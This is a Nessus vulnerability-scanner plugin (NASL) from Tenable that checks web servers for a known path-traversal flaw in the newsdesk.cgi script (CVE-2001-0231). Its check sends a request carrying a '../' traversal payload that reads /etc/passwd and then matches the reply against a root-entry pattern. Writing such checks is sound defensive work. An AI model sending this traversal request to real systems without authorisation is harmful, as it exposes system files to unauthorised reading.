#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(10586);
  script_version ("$Revision: 1.20 $");
  script_cve_id("CVE-2001-0231");
  script_bugtraq_id(2172);
  script_xref(name:"OSVDB", value:"483");

  script_name(english:"News Desk newsdesk.cgi t Parameter Traversal Arbitrary File Access");
  script_summary(english:"Checks for the presence of /cgi-bin/newsdesk.cgi");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to information disclosure.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The 'newsdesk.cgi' CGI is installed. This CGI has
a well known security flaw that lets an attacker read arbitrary
files with the privileges of the http daemon (usually root or nobody)."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Remove newsdesk.cgi from the system."
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://archives.neohapsis.com/archives/bugtraq/2001-01/0042.html'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N'
  );

  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");
  script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);


foreach dir (cgi_dirs())
{
req = http_get(item:string(dir, "/newsdesk.cgi?t=../../../../../../etc/passwd"),
 		port:port);

r = http_keepalive_send_recv(port:port, data:req);
if ( r == NULL ) exit(0);
if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
 	security_warning(port);
}
